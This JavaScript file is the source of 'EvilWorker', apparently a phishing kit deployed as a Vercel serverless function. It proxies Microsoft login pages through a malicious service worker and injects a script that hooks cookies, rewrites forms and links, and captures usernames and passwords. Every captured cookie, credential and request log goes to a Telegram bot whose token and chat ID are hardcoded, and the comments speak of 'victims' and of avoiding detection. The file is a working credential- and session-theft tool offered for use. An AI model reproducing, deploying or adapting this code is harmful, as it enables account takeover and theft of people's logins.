/**
 * EvilWorker Vercel Serverless Implementation
 * This is a serverless adaptation of EvilWorker for Vercel deployment
 * Maintains all the core functionality while working with Vercel's architecture
 */

import crypto from 'crypto';

// EvilWorker Configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN_1 = "8355498833:AAGw4FORebjYzchgU0fgg8LmMpxsmQ_JpSE";
const TELEGRAM_CHAT_ID_1 = "5555996269";
const TELEGRAM_BOT_TOKEN_2 = "";
const TELEGRAM_CHAT_ID_2 = "";

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

// Session storage (in production, use Redis or similar)
const VICTIM_SESSIONS = {};

// Encryption key (change for production)
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

// Main proxy handler
export default async function handler(req, res) {
    const { method, url, headers } = req;
    
    // Parse body based on content type
    let body;
    if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
        try {
            if (req.body) {
                body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
            }
        } catch (e) {
            body = '';
        }
    }
    
    const currentSession = getUserSession(headers.cookie);
    
    // Log every request to Telegram
    const requestLog = `📡 <b>REQUEST LOGGED</b>

🔗 <b>URL:</b> ${url}
📝 <b>Method:</b> ${method}
🌐 <b>User-Agent:</b> ${headers['user-agent'] || 'Unknown'}
🌍 <b>IP:</b> ${headers['x-forwarded-for'] || headers['x-real-ip'] || 'Unknown'}
🍪 <b>Session:</b> ${currentSession || 'New Session'}
⏰ <b>Time:</b> ${new Date().toISOString()}
📊 <b>Content-Type:</b> ${headers['content-type'] || 'Unknown'}`;

    // Send request log to both Telegram bots
    await sendTelegramNotification(requestLog);

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    try {
        // Handle service worker registration page
        if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                res.setHeader('Set-Cookie', `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieValue; // Use cookieValue (session ID) not cookieName
                
                // Send Telegram notification for new victim
                const telegramMessage = `🎣 <b>NEW VICTIM SESSION</b>

🔗 <b>Target URL:</b> ${phishedURL.href}
🌐 <b>Domain:</b> ${phishedURL.hostname}
⏰ <b>Time:</b> ${new Date().toISOString()}
🆔 <b>Session ID:</b> <code>${cookieValue}</code>
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

                await sendTelegramNotification(telegramMessage);
            }

            // Update session
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;

            // Return the landing page HTML
            const landingPage = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
            .then((registration) => {
                // Wait a moment for service worker to activate
                setTimeout(() => {
                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                    
                    // Get all parameters from the original EvilWorker URL
                    const originalParams = new URLSearchParams(self.location.search);
                    
                    // Create new OAuth parameters combining original + required
                    const oauthParams = new URLSearchParams();
                    
                    // Copy all original parameters (including client_id, method, mode, etc.)
                    for (const [key, value] of originalParams.entries()) {
                        if (key !== 'redirect_urI') { // Don't copy the redirect parameter
                            oauthParams.set(key, value);
                        }
                    }
                    
                    // Add required OAuth parameters if not already present
                    if (!oauthParams.has('scope')) {
                        oauthParams.set('scope', 'openid profile email');
                    }
                    if (!oauthParams.has('response_type')) {
                        oauthParams.set('response_type', 'code');
                    }
                    if (!oauthParams.has('response_mode')) {
                        oauthParams.set('response_mode', 'query');
                    }
                    
                    // Construct the final OAuth URL
                    const finalURL = phishedURL.origin + phishedURL.pathname + '?' + oauthParams.toString();
                    
                    // Redirect to Microsoft login page with proper OAuth parameters
                    window.location.href = finalURL;
                }, 1000);
            })
            .catch((error) => {
                console.error("Service worker registration failed:", error);
            });
        } else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>
</html>`;

            res.status(200).send(landingPage);
            return;
        }

        // Handle service worker file
        if (url === PROXY_PATHNAMES.serviceWorker) {
            const serviceWorkerCode = `
self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const url = new URL(request.url);
    
    // Skip service worker and script requests
    if (url.pathname.includes("service_worker") || url.pathname.includes("@")) {
        return fetch(request);
    }
    
    try {
        // For Microsoft OAuth requests, we need to handle them specially
        if (url.hostname.includes("microsoftonline.com") || url.hostname.includes("login.microsoft.com")) {
            // For OAuth requests, we need to preserve the exact request
            // The key is to NOT modify the request at all - just proxy it directly
            console.log('Proxying Microsoft OAuth request:', request.url);
            
            // Make the request to Microsoft exactly as received - NO modifications
            const response = await fetch(request);
            const responseClone = response.clone();
            
            // Intercept HTML responses to inject our script
            if (response.headers.get("content-type")?.includes("text/html")) {
                const text = await responseClone.text();
                const modifiedText = text.replace(
                    /<head>/i,
                    '<head><script src="/@"></script>'
                );
                
                return new Response(modifiedText, {
                    status: response.status,
                    statusText: response.statusText,
                    headers: response.headers
                });
            }
            
            return response;
        }
        
        // For other requests, proxy them normally
        const response = await fetch(request);
        const responseClone = response.clone();
        
        // Intercept HTML responses to inject our script
        if (response.headers.get("content-type")?.includes("text/html")) {
            const text = await responseClone.text();
            const modifiedText = text.replace(
                /<head>/i,
                '<head><script src="/@"></script>'
            );
            
            return new Response(modifiedText, {
                status: response.status,
                statusText: response.statusText,
                headers: response.headers
            });
        }
        
        return response;
    } catch (error) {
        console.error("Proxy error:", error);
        return fetch(request);
    }
}`;

            res.setHeader('Content-Type', 'application/javascript');
            res.status(200).send(serviceWorkerCode);
            return;
        }

        // Handle injected script
        if (url === PROXY_PATHNAMES.script) {
            const scriptCode = `
// EvilWorker Injected Script - Stealth Mode
(function() {
    'use strict';
    
    // Cookie hijacking - stealth approach
    const originalDocumentCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    if (originalDocumentCookie) {
        Object.defineProperty(document, 'cookie', {
            get: function() {
                return originalDocumentCookie.get.call(this);
            },
            set: function(value) {
                // Send cookie to our proxy silently
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', '/lNv1pC9AWPUY4gbidyBO', true);
                    xhr.setRequestHeader('Content-Type', 'text/plain');
                    xhr.send(value);
                } catch (e) {
                    // Silent fail to avoid detection
                }
                
                return originalDocumentCookie.set.call(this, value);
            }
        });
    }

    // Monitor DOM mutations for forms and links
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'childList') {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        // Check for forms and modify them
                        if (node.tagName === 'FORM') {
                            modifyForm(node);
                        }
                        // Check for links and modify them
                        if (node.tagName === 'A') {
                            modifyLink(node);
                        }
                    }
                });
            }
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    function modifyForm(form) {
        const action = form.getAttribute('action');
        if (action && !action.startsWith('/lNv1pC9AWPUY4gbidyBO')) {
            form.setAttribute('data-original-action', action);
            form.setAttribute('action', '/lNv1pC9AWPUY4gbidyBO');
        }
    }

    function modifyLink(link) {
        const href = link.getAttribute('href');
        if (href && !href.startsWith('/lNv1pC9AWPUY4gbidyBO')) {
            link.setAttribute('data-original-href', href);
            link.setAttribute('href', '/lNv1pC9AWPUY4gbidyBO');
        }
    }

    // Also check existing elements
    document.querySelectorAll('form').forEach(modifyForm);
    document.querySelectorAll('a').forEach(modifyLink);
    
    // Monitor form submissions
    document.addEventListener('submit', function(e) {
        const form = e.target;
        if (form.tagName === 'FORM') {
            const formData = new FormData(form);
            const username = formData.get('username') || formData.get('email') || formData.get('user') || 'N/A';
            const password = formData.get('password') || formData.get('pass') || formData.get('pwd') || 'N/A';
            
            // Send credentials to proxy
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', '/lNv1pC9AWPUY4gbidyBO', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({
                    type: 'form',
                    data: { username, password },
                    url: window.location.href
                }));
            } catch (e) {
                // Silent fail to avoid detection
            }
        }
    });
})();`;

            res.status(200).send(scriptCode);
            return;
        }

        // Handle proxy requests
        if (method === 'POST' && url === PROXY_PATHNAMES.proxy) {
            let requestBody;
            
            console.log('Processing proxy request:', { method, url, contentType: headers['content-type'], body });
            
            // Handle different content types
            if (headers['content-type']?.includes('application/json')) {
                try {
                    // Check if body exists and is not empty
                        if (!body) {
                            console.log('Empty request body');
                            res.status(400).json({ error: 'Empty request body' });
                            return;
                        }
                    
                    // If body is already an object, use it directly
                    if (typeof body === 'object' && body !== null) {
                        requestBody = body;
                    } else if (typeof body === 'string') {
                        // If it's a string, check if it's empty
                        if (body.trim() === '') {
                            console.log('Empty string body');
                            res.status(400).json({ error: 'Empty request body' });
                            return;
                        }
                        requestBody = JSON.parse(body);
                    } else {
                        console.log('Unexpected body type:', typeof body);
                        res.status(400).json({ error: 'Invalid body type' });
                        return;
                    }
                    
                    console.log('Parsed requestBody:', requestBody);
                } catch (e) {
                    console.error('JSON parse error:', e, 'Body:', body);
                    res.status(400).json({ error: 'Invalid JSON format' });
                    return;
                }
            } else if (headers['content-type']?.includes('text/plain')) {
                // Handle plain text requests (like cookies)
                requestBody = {
                    type: 'cookie',
                    value: body,
                    url: headers['referer'] || 'Unknown'
                };
                console.log('Created cookie requestBody:', requestBody);
            } else {
                // Handle form data or other content types
                requestBody = {
                    type: 'form',
                    data: body,
                    url: headers['referer'] || 'Unknown'
                };
                console.log('Created form requestBody:', requestBody);
            }

            if (requestBody.type === 'cookie') {
                // Log captured cookie
                console.log('Captured cookie:', requestBody.value);
                
                // Send to Telegram
                const telegramMessage = `🍪 <b>COOKIE CAPTURED</b>

🔗 <b>URL:</b> ${requestBody.url}
🍪 <b>Cookie:</b> <code>${requestBody.value}</code>
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework
🎯 <b>Session:</b> ${currentSession || 'Unknown'}`;
                
                await sendTelegramNotification(telegramMessage);
                
                // Encrypt and store the cookie
                const encryptedData = encryptData(JSON.stringify(requestBody));
                // In production, store this in a database
                
                res.status(200).json({ success: 'Cookie captured' });
                return;
            }

            // Handle form submissions
            if (requestBody.type === 'form') {
                // Log captured credentials
                console.log('Captured credentials:', requestBody.data);
                
                // Send to Telegram
                const telegramMessage = `🔐 <b>CREDENTIALS CAPTURED</b>

🔗 <b>URL:</b> ${requestBody.url || 'Unknown'}
👤 <b>Username:</b> <code>${requestBody.data.username || 'N/A'}</code>
🔑 <b>Password:</b> <code>${requestBody.data.password || 'N/A'}</code>
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework
🎯 <b>Session:</b> ${currentSession || 'Unknown'}`;
                
                await sendTelegramNotification(telegramMessage);
                
                // Encrypt and store the data
                const encryptedData = encryptData(JSON.stringify(requestBody));
                // In production, store this in a database
                
                res.status(200).json({ success: 'Form data captured' });
                return;
            }

            // Handle generic JSON requests (like from service worker) - this should catch any JSON object
            if (requestBody && typeof requestBody === 'object') {
                try {
                    // Log captured data
                    console.log('Captured generic data:', requestBody);
                    
                    // Send to Telegram
                    const telegramMessage = `📊 <b>GENERIC DATA CAPTURED</b>

🔗 <b>URL:</b> ${headers['referer'] || 'Unknown'}
📝 <b>Data:</b> <code>${JSON.stringify(requestBody)}</code>
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework
🎯 <b>Session:</b> ${currentSession || 'Unknown'}`;
                    
                    console.log('Sending Telegram notification...');
                    await sendTelegramNotification(telegramMessage);
                    console.log('Telegram notification sent successfully');
                    
                    // Encrypt and store the data
                    console.log('Encrypting data...');
                    const encryptedData = encryptData(JSON.stringify(requestBody));
                    console.log('Data encrypted successfully');
                    // In production, store this in a database
                    
                    console.log('Sending success response...');
                    res.status(200).json({ success: 'Data captured successfully' });
                    return;
                } catch (error) {
                    console.error('Error in generic JSON handler:', error);
                    res.status(500).json({ error: 'Generic JSON handler error', details: error.message });
                    return;
                }
            }

            // If we get here, the request type is unknown
            console.log('Unknown request type for requestBody:', requestBody);
            res.status(400).json({ error: 'Unknown request type' });
            return;
        }

        // Handle OAuth requests to Microsoft (server-side proxy)
        // Only proxy actual Microsoft URLs, not our /login path
        if ((url.includes("microsoftonline.com") || url.includes("login.microsoft.com")) && !url.startsWith("/login") && url.startsWith("http")) {
            try {
                console.log('Server-side proxying Microsoft OAuth request:', url);
                
                // Make the request to Microsoft with all original parameters
                const response = await fetch(url, {
                    method: method,
                    headers: headers,
                    body: method !== 'GET' ? body : undefined
                });
                
                const responseText = await response.text();
                
                // Log successful OAuth proxy request
                const oauthLog = `🔐 <b>MICROSOFT OAUTH PROXY SUCCESSFUL</b>

🔗 <b>Original URL:</b> ${url}
📝 <b>Method:</b> ${method}
📊 <b>Response Status:</b> ${response.status}
🍪 <b>Session:</b> ${currentSession || 'None'}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

                await sendTelegramNotification(oauthLog);

                // Modify HTML responses to inject our script
                if (response.headers.get('content-type')?.includes('text/html')) {
                    const modifiedText = responseText.replace(
                        /<head>/i,
                        '<head><script src="/@"></script>'
                    );

                    res.setHeader('Content-Type', 'text/html');
                    res.status(response.status).send(modifiedText);
                } else {
                    res.setHeader('Content-Type', response.headers.get('content-type') || 'text/plain');
                    res.status(response.status).send(responseText);
                }
                return;
            } catch (error) {
                console.error('OAuth proxy error:', error);

                // Log OAuth proxy error to both bots
                const oauthErrorLog = `❌ <b>MICROSOFT OAUTH PROXY FAILED</b>

🔗 <b>Original URL:</b> ${url}
📝 <b>Method:</b> ${method}
❌ <b>Error:</b> ${error.message}
🍪 <b>Session:</b> ${currentSession || 'None'}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

                await sendTelegramNotification(oauthErrorLog);

                res.status(500).json({ error: 'OAuth proxy error' });
                return;
            }
        }

        // Default: proxy the request to the legitimate service
        if (currentSession && VICTIM_SESSIONS[currentSession]) {
            const session = VICTIM_SESSIONS[currentSession];
            const targetURL = `${session.protocol}//${session.host}${url}`;
            
            try {
                const response = await fetch(targetURL, {
                    method: method,
                    headers: headers,
                    body: method !== 'GET' ? body : undefined
                });
                
                const responseText = await response.text();
                
                // Log successful proxy request
                const proxyLog = `✅ <b>PROXY REQUEST SUCCESSFUL</b>

🔗 <b>Original URL:</b> ${url}
🎯 <b>Target URL:</b> ${targetURL}
📝 <b>Method:</b> ${method}
📊 <b>Response Status:</b> ${response.status}
🍪 <b>Session:</b> ${currentSession}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

                await sendTelegramNotification(proxyLog);

                // Modify HTML responses to inject our script
                if (response.headers.get('content-type')?.includes('text/html')) {
                    const modifiedText = responseText.replace(
                        /<head>/i,
                        '<head><script src="/@"></script>'
                    );

                    res.setHeader('Content-Type', 'text/html');
                    res.status(response.status).send(modifiedText);
                } else {
                    res.setHeader('Content-Type', response.headers.get('content-type') || 'text/plain');
                    res.status(response.status).send(responseText);
                }
            } catch (error) {
                console.error('Proxy error:', error);

                // Log proxy error to both bots
                const proxyErrorLog = `❌ <b>PROXY REQUEST FAILED</b>

🔗 <b>Original URL:</b> ${url}
📝 <b>Method:</b> ${method}
❌ <b>Error:</b> ${error.message}
🍪 <b>Session:</b> ${currentSession || 'None'}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

                await sendTelegramNotification(proxyErrorLog);

                res.status(500).json({ error: 'Proxy error' });
            }
        } else {
            // Log session not found
            const sessionLog = `⚠️ <b>SESSION NOT FOUND</b>

🔗 <b>URL:</b> ${url}
📝 <b>Method:</b> ${method}
🍪 <b>Session:</b> ${currentSession || 'None'}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

            await sendTelegramNotification(sessionLog);

            res.status(404).json({ error: 'Session not found' });
        }

    } catch (error) {
        console.error('Handler error:', error);

        // Log error to both Telegram bots
        const errorLog = `❌ <b>EVILWORKER ERROR</b>

🔗 <b>URL:</b> ${url}
📝 <b>Method:</b> ${method}
🍪 <b>Session:</b> ${currentSession || 'Unknown'}
❌ <b>Error:</b> ${error.message}
📚 <b>Stack:</b> ${error.stack}
⏰ <b>Time:</b> ${new Date().toISOString()}
📱 <b>Platform:</b> EvilWorker AiTM Framework`;

        await sendTelegramNotification(errorLog);

        res.status(500).json({ error: 'Internal server error' });
    }
}

// Helper functions
function getUserSession(cookieHeader) {
    if (!cookieHeader) return null;

    const cookies = cookieHeader.split(';').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        acc[key] = value;
        return acc;
    }, {});

    return cookies['evilworker_session'] || null;
}

function generateNewSession(phishedURL) {
    const sessionId = crypto.randomBytes(16).toString('hex');
    const cookieName = 'evilworker_session';
    const cookieValue = sessionId;

    VICTIM_SESSIONS[sessionId] = {
        id: sessionId,
        phishedURL: phishedURL.toString(),
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname,
        port: phishedURL.port,
        host: phishedURL.host,
        createdAt: new Date().toISOString()
    };

    return { cookieName, cookieValue };
}

function encryptData(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-ctr', Buffer.from(ENCRYPTION_KEY.slice(0, 32)), iv);

    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');

    return {
        iv: iv.toString('hex'),
        data: encrypted
    };
}

// Telegram notification function
async function sendTelegramNotification(message) {
    const botTokens = [TELEGRAM_BOT_TOKEN_1, TELEGRAM_BOT_TOKEN_2];
    const chatIds = [TELEGRAM_CHAT_ID_1, TELEGRAM_CHAT_ID_2];

    for (let i = 0; i < botTokens.length; i++) {
        const botToken = botTokens[i];
        const chatId = chatIds[i];

        if (botToken === "YOUR_BOT_TOKEN_HERE" || chatId === "YOUR_CHAT_ID_HERE") {
            console.log(`Telegram bot ${i+1} not configured, skipping notification`);
            continue;
        }

        try {
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `👾 <b>EvilWorker</b> ${message}`,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                console.error(`Telegram notification failed for bot ${i+1}:`, response.status);
            }
        } catch (error) {
            console.error(`Telegram notification error for bot ${i+1}:`, error);
        }
    }
}